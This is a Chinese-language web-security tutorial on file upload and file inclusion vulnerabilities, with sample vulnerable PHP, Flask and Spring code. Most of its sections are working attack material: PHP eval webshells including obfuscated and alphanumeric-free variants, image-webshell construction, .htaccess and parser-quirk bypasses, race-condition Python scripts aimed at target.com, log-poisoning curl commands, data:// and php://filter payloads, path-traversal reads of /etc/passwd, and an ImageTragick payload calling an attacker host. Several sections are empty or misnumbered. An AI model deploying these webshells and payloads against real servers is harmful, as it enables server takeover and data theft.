## 1. 文件操作类漏洞概述

### 1.1 什么是文件操作类漏洞

文件操作类漏洞是指 Web 应用程序在处理文件上传、包含、读取、下载、删除、写入等操作时，由于对用户输入的文件路径、文件名、文件内容等缺乏充分的验证和过滤，导致攻击者能够执行非预期的文件操作，从而危害系统安全的一类漏洞。

### 1.2 文件操作类漏洞分类

| 漏洞类型 | 说明 | 危害等级 |
|---------|------|---------|
| **文件上传漏洞** | 允许用户上传恶意文件（WebShell、恶意脚本等） | ⭐⭐⭐⭐⭐ |
| **文件包含漏洞** | 包含用户可控的文件路径（LFI/RFI），导致代码执行 | ⭐⭐⭐⭐⭐ |
| **文件下载/读取漏洞** | 可以读取任意文件（路径遍历） | ⭐⭐⭐⭐ |
| **XXE漏洞** | XML外部实体注入，可读取文件、SSRF、命令执行 | ⭐⭐⭐⭐ |
| **文件删除漏洞** | 可以删除任意文件 | ⭐⭐⭐ |
| **文件写入漏洞** | 可以写入任意内容到指定文件 | ⭐⭐⭐⭐ |

### 1.3 文件操作类漏洞的关系

```
                  ┌─────────────────────────────┐
                  │     用户输入/请求数据        │
                  └──────────┬──────────────────┘
                             │
            ┌────────────────┼──────────────────┐
            │                │                  │
            ▼                ▼                  ▼
    ┌──────────────┐ ┌──────────────┐ ┌──────────────┐
    │  文件上传     │ │  文件包含    │ │  文件读/写   │
    │  (Upload)    │ │  (Include)  │ │  (Read/Write)│
    └──────┬───────┘ └──────┬───────┘ └──────┬───────┘
           │                │                │
           ▼                ▼                ▼
    ┌──────────────┐ ┌──────────────┐ ┌──────────────┐
    │  WebShell    │ │  代码执行    │ │  信息泄露    │
    │  控制服务器  │ │  RCE/RFI    │ │  路径遍历    │
    └──────────────┘ └──────────────┘ └──────────────┘
```

## 2. 文件上传漏洞

### 2.1 文件上传漏洞概述

#### 2.1.1 什么是文件上传漏洞

文件上传漏洞是指 Web 应用程序允许用户上传文件，但对上传文件的类型、内容、大小等缺乏严格的校验，导致攻击者可以上传恶意文件（如 WebShell、恶意脚本、病毒文件等）到服务器上，从而获取服务器控制权或对其他用户造成危害。

#### 2.1.2 文件上传漏洞的危害

1. **获取 WebShell**：上传 PHP/JSP/ASP 等脚本文件，直接控制服务器
2. **恶意文件传播**：上传病毒、木马、勒索软件等
3. **存储型 XSS**：上传包含 XSS 代码的 HTML/SVG 文件
4. **覆盖关键文件**：上传同名的配置文件覆盖系统文件
5. **钓鱼攻击**：上传伪造的登录页面

### 2.2 文件上传基础

#### 2.2.1 HTTP 文件上传原理

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/x-php

<?php phpinfo(); ?>
------WebKitFormBoundary--
```

**关键字段解释：**
- `Content-Type: multipart/form-data` — 必须的编码类型
- `boundary=xxx` — 分隔符，用于分隔不同表单字段
- `Content-Disposition` — 表单字段名称和文件名
- `Content-Type`（文件类型）— 客户端声明的文件 MIME 类型

#### 2.2.2 常见的文件上传函数

**PHP 文件上传：**
```php
<?php
// 最简单的文件上传处理
if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
    $tmp_name = $_FILES['file']['tmp_name'];
    $name = $_FILES['file']['name'];
    move_uploaded_file($tmp_name, "uploads/" . $name);
}
?>
```

**Python (Flask) 文件上传：**
```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    file.save('uploads/' + file.filename)
    return 'Upload OK'
```

**Java (Spring) 文件上传：**
```java
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) {
    String filename = file.getOriginalFilename();
    file.transferTo(new File("uploads/" + filename));
    return "Upload OK";
}
```

#### 2.2.3 文件上传检测机制

文件上传的检测通常发生在以下几个层面：

```
用户请求
    │
    ├── 1. 客户端检测（JavaScript）
    │    ├── 文件后缀检测
    │    ├── 文件大小检测
    │    └── MIME 类型检测（不可信）
    │
    ├── 2. 服务端检测
    │    ├── Content-Type 检测（MIME）
    │    ├── 文件后缀/扩展名检测
    │    ├── 文件头（Magic Number）检测
    │    ├── 文件内容检测
    │    └── 文件大小检测
    │
    ├── 3. 文件系统层面
    │    ├── 目录权限控制
    │    ├── 文件重命名
    │    └── 执行权限控制
    │
    └── 4. WAF/安全组件检测
         ├── 特征码匹配
         ├── 行为分析
         └── 恶意代码检测
```

### 2.3 文件上传漏洞利用（入门级）

#### 2.3.1 前端 JS 校验绕过

**场景：** 前端使用 JavaScript 限制了上传文件类型。

```javascript
// 前端 JS 限制
function checkFile() {
    var file = document.getElementById('file').value;
    if (file.lastIndexOf('.') != -1) {
        var ext = file.substring(file.lastIndexOf('.') + 1).toLowerCase();
        if (ext != 'jpg' && ext != 'png' && ext != 'gif') {
            alert('只能上传图片文件！');
            return false;
        }
    }
}
```

**绕过方法：**

1. **直接发送 HTTP 请求**（使用 Burp Suite、cURL 等工具）
```bash
curl -X POST -F "file=@shell.php" http://target.com/upload
```

2. **禁用浏览器 JavaScript**
3. **修改前端 JS 或拦截响应**
4. **使用浏览器开发者工具删除 `onsubmit` 事件**

#### 2.3.2 MIME 类型绕过

**场景：** 服务端检查 `Content-Type` 是否为图片类型。

```php
<?php
// 仅检查 Content-Type
if ($_FILES['file']['type'] == 'image/jpeg' || 
    $_FILES['file']['type'] == 'image/png') {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}
?>
```

**绕过方法：** 使用 Burp Suite 拦截请求，修改 Content-Type

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg              ← 改为 image/jpeg

<?php @eval($_POST['cmd']); ?>
------WebKitFormBoundary--
```

#### 2.3.3 文件后缀黑名单绕过

**场景：** 服务端黑名单过滤了常见的可执行脚本后缀。

```php
<?php
$blacklist = ['php', 'asp', 'aspx', 'jsp', 'exe', 'sh'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (in_array(strtolower($ext), $blacklist)) {
    die('不允许上传此类型文件');
}
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
?>
```

**绕过方法：**

| 绕过方式 | 示例 | 说明 |
|---------|------|------|
| 大小写混淆 | `.PhP`, `.Asp` | 如果服务器不区分大小写则可能生效 |
| 双重扩展名 | `shell.php.jpg` | 某些服务器只检查最后一个扩展名 |
| 特殊字符 | `shell.php.`, `shell.php ` | 空格、点号等导致扩展名解析异常 |
| 路径截断 | `shell.php%00.jpg` | 利用空字节截断（仅 PHP < 5.3.4） |
| .htaccess 绕过 | `.htaccess` | 上传配置文件修改解析规则 |
| 解析漏洞 | `shell.php;.jpg` | 利用中间件解析差异 |

#### 2.3.4 .htaccess 绕过

**场景：** 黑名单过滤了常见后缀，但未过滤 `.htaccess` 文件。

**攻击步骤：**

**Step 1：上传 `.htaccess` 文件**
```apache
# .htaccess 内容
AddType application/x-httpd-php .jpg
# 这会将所有 .jpg 文件当作 PHP 解析
```

**Step 2：上传图片马（例如 `shell.jpg`）**
```php
<?php @eval($_POST['cmd']); ?>
```

**Step 3：访问 `shell.jpg` 即可执行 PHP 代码**

#### 2.3.5 图片马制作

**方法一：直接在图片后追加代码**
```bash
# 复制一张正常图片，然后在末尾追加 PHP 代码
cp normal.jpg shell.jpg
echo '<?php @eval($_POST["cmd"]); ?>' >> shell.jpg

# 查看合并后的文件
cat shell.jpg
```

**方法二：使用工具合并**
```bash
# Windows
copy normal.jpg /b + shell.php /a shell.jpg

# Linux
cat normal.jpg shell.php > shell.jpg
```

**验证图片完整性：**
```bash
# 图片仍能正常打开，但 PHP 解析时会执行其中的代码
identify -verbose shell.jpg
```

### 2.4 文件上传漏洞利用（进阶）

#### 2.4.1 条件竞争上传

**场景：** 文件先被保存到服务器，然后再进行验证或删除。利用验证与删除之间的时间差上传恶意文件。

```php
<?php
// 漏洞代码：先保存，再检查
$tmp_path = 'uploads/' . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $tmp_path);

// 然后才检查，如果不是图片就删除
if (!getimagesize($tmp_path)) {
    unlink($tmp_path);
    die('不是有效的图片文件');
}
?>
```

**利用方法：**
```python
import requests
import threading

# 持续上传恶意文件
def upload():
    while True:
        files = {'file': ('shell.php', '<?php @eval($_POST["cmd"]);?>', 'image/jpeg')}
        requests.post('http://target.com/upload', files=files)

# 持续访问上传的文件
def access():
    while True:
        r = requests.get('http://target.com/uploads/shell.php')
        if r.status_code == 200 and len(r.text) > 0:
            print("WebShell 上传成功！")
            break

threads = []
for _ in range(10):
    t = threading.Thread(target=upload)
    threads.append(t)
    t.start()

for _ in range(10):
    t = threading.Thread(target=access)
    threads.append(t)
    t.start()
```

#### 2.4.2 文件头（Magic Number）检测绕过

**场景：** 服务端检查文件头（文件幻数），只允许图片文件。

```php
<?php
// 检查文件头
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) {
    die('不是有效的图片文件');
}
?>
```

**常见文件幻数：**

| 文件类型 | 幻数（十六进制） | 幻数（ASCII） |
|---------|-----------------|--------------|
| JPEG | `FF D8 FF E0` | `ÿØÿà` |
| PNG | `89 50 4E 47` | `‰PNG` |
| GIF | `47 49 46 38` | `GIF8` |
| BMP | `42 4D` | `BM` |
| ZIP | `50 4B 03 04` | `PK` |
| PDF | `25 50 44 46` | `%PDF` |

**绕过方法：在恶意代码前添加文件幻数**

```bash
# 方法1：使用图片头 + PHP 代码
echo -e '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > shell.php
echo '<?php @eval($_POST["cmd"]); ?>' >> shell.php

# 方法2：使用 copy 命令合并
# Windows
copy /b 1.jpg + shell.php shell_upload.php

# Linux
cat 1.jpg shell.php > shell_upload.php
```

#### 2.4.3 内容检测绕过

**场景：** 检测文件内容是否包含 `<?php` 等危险关键字。

```php
<?php
// 内容检测示例
$content = file_get_contents($_FILES['file']['tmp_name']);
if (preg_match('/<\?php/i', $content) || preg_match('/<script/i', $content)) {
    die('检测到危险代码');
}
?>
```

**绕过方法：**

```php
<?php
// 方式1：使用不同的标签风格
<script language="php">@eval($_POST['cmd']);</script>
<? @eval($_POST['cmd']); ?>           // 短标签（需要 short_open_tag 开启）

// 方式2：使用编码
<?php
$c = base64_decode('JGNtZA0K');
@eval($c);
?>

// 方式3：使用拼接
<?php
$a = 'sys';
$b = 'tem';
$c = $a.$b;
$c($_POST['cmd']);
?>

// 方式4：利用回调函数
<?php
array_map('system', ['whoami']);
call_user_func('system', 'whoami');
?>

// 方式5：使用文件包含绕过
<?php include('php://input'); ?>
// 然后 POST 数据: <?php system('whoami'); ?>
```

#### 2.4.4 图片马 + 文件包含组合拳

### 2.5 文件上传漏洞利用（高级）

#### 2.5.1 Apache 解析漏洞

**漏洞描述：** Apache 从右向左解析扩展名，遇到不认识的扩展名则继续向左解析。

```bash
# 上传文件
shell.php.xxx.aaa.bbb

# Apache 解析：
# .bbb → 不认识，跳过
# .aaa → 不认识，跳过
# .xxx → 不认识，跳过
# .php → 认识！按 PHP 解析
```

**常见利用：**
```bash
shell.php.cgi
shell.php.pl
shell.php.txt       # 如果系统将 .txt 关联到其他处理器
```

#### 2.5.2 Apache `.htaccess` 解析漏洞

**场景：** 上传 `.htaccess` 文件修改特定文件的解析方式。

```apache
# 让所有图片都按 PHP 解析
AddType application/x-httpd-php .jpg .png .gif

# 或者让特定文件按 PHP 解析
<FilesMatch "shell">
    SetHandler application/x-httpd-php
</FilesMatch>
```

#### 2.5.3 Nginx 解析漏洞

**漏洞描述：** 当 Nginx 配置了 `cgi.fix_pathinfo=1` 时，对于 URL `/upload/shell.jpg/nonexist.php`，Nginx 会将其交给 PHP 处理，PHP 会认为要执行的是 `shell.jpg`。

```bash
# 上传图片马 shell.jpg
# 访问
http://target.com/upload/shell.jpg/nonexist.php
http://target.com/upload/shell.jpg%00.php

# 原理：Nginx 看到 .php 后缀，交给 PHP 处理
# PHP 从右向左找，找不到 nonexist.php，就执行 shell.jpg
```

#### 2.5.4 IIS 解析漏洞

**IIS 6.0 解析漏洞：**

```bash
# 方式1：目录名解析
# 创建 shell.asp 目录，目录下所有文件按 ASP 解析
/uploads/shell.asp/shell.jpg

# 方式2：分号截断
shell.asp;.jpg    → 按 ASP 解析
```

**IIS 7.0/7.5 解析漏洞：**

```bash
# 类似 Nginx，当 fastcgi 开启时
shell.jpg/nonexist.php
```

#### 2.5.5 Windows 文件流（NTFS ADS）利用

```bash
# NTFS 交换数据流
shell.php:stream.jpg

# Windows 特性：文件流数据可能被忽略
# 上传时实际内容写入 shell.php
# 文件系统显示为 shell.php
```

#### 2.5.6 无字母数字 WebShell

**场景：** 对上传内容进行严格过滤，只允许非字母数字内容。

**原理：** 利用 PHP 的异或（`^`）、取反（`~`）等位运算构造代码。

```php
<?php
// 无字母数字 WebShell 示例
$_ = [];
$_ = @"$_";  // Array
$_ = '$_';
$_ = ($_ == $_);  // true → 1
$__ = $_;
$_ = $__ == $_;  // false
$_ = $_ . $__;   // "10"

// 更复杂的构造
$__ = (string)('.' ^ '~');  // 构造字符
$_ = ('!' ^ '@');           // 构造字符

// 通过异或构造出 system 等函数名
${~"\xa0\xb8\xba\xab"}[0](${~"\xa0\xb8\xba\xab\xb8\xac"}[1]);
// 等价于: $_GET[0]($_GET[1]); 即 system('whoami');
?>
```

#### 2.5.7 CVE 漏洞利用

**CVE-2018-5711（PHP GD 库）：** PHP GD 库处理 GIF 图片时的堆栈溢出。

**ImageMagick 漏洞（CVE-2016-3714）：** 处理图片时执行任意命令。

```bash
# ImageMagick RCE（利用 ImageTragick）
push graphic-context
viewbox 0 0 1 1
image over 0,0 1,1 'https://example.com/`whoami`.attacker.com/'
pop graphic-context
```

## 3. 文件包含漏洞

### 3.1 文件包含漏洞概述

#### 3.1.1 什么是文件包含漏洞

文件包含漏洞（File Inclusion）是指 Web 应用程序在通过函数引入文件时，用户能够控制被包含文件的路径，从而引入恶意文件或执行非预期操作的漏洞。

#### 3.1.2 文件包含的分类

| 类型 | 说明 | 危害 |
|------|------|------|
| **LFI（本地文件包含）** | 包含服务器本地的文件 | 读取敏感文件、包含日志文件RCE |
| **RFI（远程文件包含）** | 包含远程服务器上的文件 | 直接执行攻击者控制的恶意代码 |

#### 3.1.3 文件包含的危害

1. **敏感信息泄露**：读取 `/etc/passwd`、数据库配置等
2. **代码执行**：包含图片马、日志文件等达到 RCE
3. **远程代码执行**：RFI 直接执行远程恶意脚本
4. **目录遍历**：越权访问其他目录的文件
5. **SSRF**：利用文件包含发起服务器端请求

### 3.2 文件包含基础

#### 3.2.1 常见文件包含函数

**PHP 文件包含函数：**

| 函数 | 特点 | 是否执行 PHP |
|------|------|-------------|
| `include()` | 包含并执行文件，失败时产生警告 | 是 |
| `require()` | 同 include，失败时产生致命错误 | 是 |
| `include_once()` | 只包含一次，避免重复 | 是 |
| `require_once()` | 只包含一次，失败时致命错误 | 是 |
| `fopen()` / `fread()` | 打开/读取文件，不执行 | 否 |
| `file_get_contents()` | 读取文件内容，不执行 | 否 |

**其他语言的文件包含函数：**

```python
# Python
exec(open('file.php').read())  # 执行文件内容
import os                      # 导入模块

# Java
RequestDispatcher.include()     # JSP 包含
Runtime.getRuntime().exec()     # 执行命令

# Node.js
require('./file.js')           # 导入模块
fs.readFileSync('./file.txt')  # 读取文件
```

#### 3.3.2 包含日志文件（Log Poisoning）

**原理：** 将恶意代码写入到日志文件中，然后通过 LFI 包含日志文件触发代码执行。

**Apache 访问日志位置：**
```bash
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/apache/access.log
```

**攻击步骤：**

**Step 1：向日志中写入恶意代码**
```bash
# 在 User-Agent 中写入 PHP 代码
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/index.php?page=test
```

**Step 2：包含日志文件触发执行**
```bash
http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
```

**其他可包含的日志文件：**

| 日志文件 | 路径 |
|---------|------|
| Apache 访问日志 | `/var/log/apache2/access.log`, `/var/log/httpd/access_log` |
| Apache 错误日志 | `/var/log/apache2/error.log`, `/var/log/httpd/error_log` |
| SSH 日志 | `/var/log/auth.log` |
| FTP 日志 | `/var/log/vsftpd.log` |
| MySQL 日志 | `/var/log/mysql/error.log` |
| Nginx 访问日志 | `/var/log/nginx/access.log` |
| PHP-FPM 日志 | `/var/log/php7.x-fpm.log` |

#### 3.3.3 包含 /proc/self/environ

**原理：** `/proc/self/environ` 包含了当前进程的环境变量，如果 User-Agent 等 HTTP 头信息被记录在环境变量中，就可以插入恶意代码。

```bash
# 1. 发送包含恶意代码的请求
curl -A "<?php system('id');?>" http://target.com/

# 2. 包含 environ 文件
http://target.com/index.php?page=../../../../proc/self/environ
```

> **注意：** 现代 Linux 系统对 `/proc/self/environ` 的读取权限限制较严格，需要 Web 用户有读取权限。

#### 3.3.4 包含 PHP 输入流（php://input）

**原理：** `php://input` 可以读取 HTTP POST 的原始数据，如果 allow_url_include 开启，可以执行 POST 中的 PHP 代码。

```php
// 漏洞代码（必须 allow_url_include=On）
include($_GET['page']);
```

**利用：**
```bash
# POST 请求发送 PHP 代码
curl -X POST -d '<?php system("whoami");?>' \
  "http://target.com/index.php?page=php://input"
```

#### 3.3.5 包含 PHP 过滤器读取文件（php://filter）

**原理：** 使用 `php://filter` 流读取文件内容并编码，常用于读取 PHP 文件源码。

```bash
# 读取 PHP 文件源码（base64 编码，防止被解析执行）
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php

# 读取后解码
echo "PD9waHA..." | base64 -d

# 其他可用的过滤器
php://filter/read=convert.base64-encode/resource=file.txt
php://filter/read=string.rot13/resource=file.txt
php://filter/convert.iconv.utf-8.utf-16/resource=file.txt
```

#### 3.3.6 包含 PHP 封装协议

PHP 提供了一系列的流封装协议（Wrapper），可以用于各种文件包含场景：

| 协议 | 用途 | 条件 |
|------|------|------|
| `file://` | 访问本地文件系统 | 无特殊要求 |
| `http://` / `https://` | 访问远程 URL | `allow_url_include=On` |
| `ftp://` | 访问 FTP 服务器 | `allow_url_include=On` |
| `php://` | 访问各种 I/O 流 | 部分需要特定配置 |
| `zip://` | 访问 ZIP 压缩包内的文件 | PHP >= 5.2.0 |
| `phar://` | 访问 PHAR 归档文件 | PHP >= 5.3.0 |
| `data://` | 直接嵌入数据 | `allow_url_include=On` |
| `expect://` | 执行系统命令 | 需安装 expect 扩展 |
| `compress.zlib://` | 访问 gzip 压缩文件 | 需 zlib 支持 |
| `compress.bzip2://` | 访问 bzip2 压缩文件 | 需 bzip2 支持 |

**data:// 协议利用：**
```bash
# 直接包含 Base64 编码的 PHP 代码
http://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==

# 等价于执行: <?php system('whoami');?>
```

**zip:// 协议利用：**
```bash
# 1. 创建包含 PHP 文件的 ZIP 压缩包
zip malicious.zip shell.php

# 2. 通过 zip:// 协议包含
http://target.com/index.php?page=zip://uploads/malicious.zip%23shell.php
# 注意: %23 是 # 的 URL 编码
```

**phar:// 协议利用（可触发反序列化）：**
```bash
# 包含 phar 归档内的文件
http://target.com/index.php?page=phar://uploads/test.phar/test.txt
```

#### 3.3.7 临时文件包含（Race Condition）

**原理：** PHP 上传文件时会在 `/tmp` 目录下创建临时文件（如 `phpXXXXXX`），这些临时文件在请求结束后会被删除。利用条件竞争，在临时文件存在的时间内包含它。

```python
import requests
import threading

# 包含临时文件的 payload
def include_race():
    while True:
        try:
            requests.get(
                'http://target.com/index.php',
                params={'page': '/tmp/phpXXXXXX'},
                timeout=0.1
            )
        except:
            pass

# 上传文件（将恶意代码注入临时文件）
def upload():
    while True:
        requests.post(
            'http://target.com/upload',
            files={'file': ('test.txt', '<?php system("id");?>')}
        )

# 同时启动多个线程
threading.Thread(target=include_race).start()
threading.Thread(target=upload).start()
```

### 3.5 文件包含绕过技术

#### 3.5.1 路径遍历过滤绕过

```bash
# 过滤了 ../ 时的绕过
....//     → 处理后变成 ../
....\/     → 处理后变成 ../
..%252f..%252f  → 二次 URL 编码
..%c0%ae..%c0%ae → UTF-8 编码绕过
```

#### 3.5.2 后缀添加绕过

**场景：** 代码自动添加 `.php` 后缀。

```php
include($page . '.php');
```

**绕过方法：**

```bash
# 1. 空字节截断（PHP < 5.3.4）
?page=../../../etc/passwd%00

# 2. 路径长度截断（Windows 256字符，Linux 4096字符）
?page=../../../etc/passwd/././././././...[超长路径]..././

# 3. 使用 phar 协议（不受后缀追加影响）
?page=phar://uploads/test.phar

# 4. 使用 data:// 或 php:// 协议
?page=php://filter/convert.base64-encode/resource=config
# 执行 include('php://filter/.../config.php'); → 变成 include('php://filter/.../config.php');

# 5. 问号截断（PHP 参数部分）
?page=../../../etc/passwd?   # 后缀 .php 成为 URL 参数
# 实际解析：include('../../../etc/passwd? .php'); → 访问文件系统中的 '../../../etc/passwd? .php'
# 但文件系统可能忽略 ? 后面的内容

# 6. 井号截断
?page=../../../etc/passwd%23  # # 是 URL 中的锚点
```
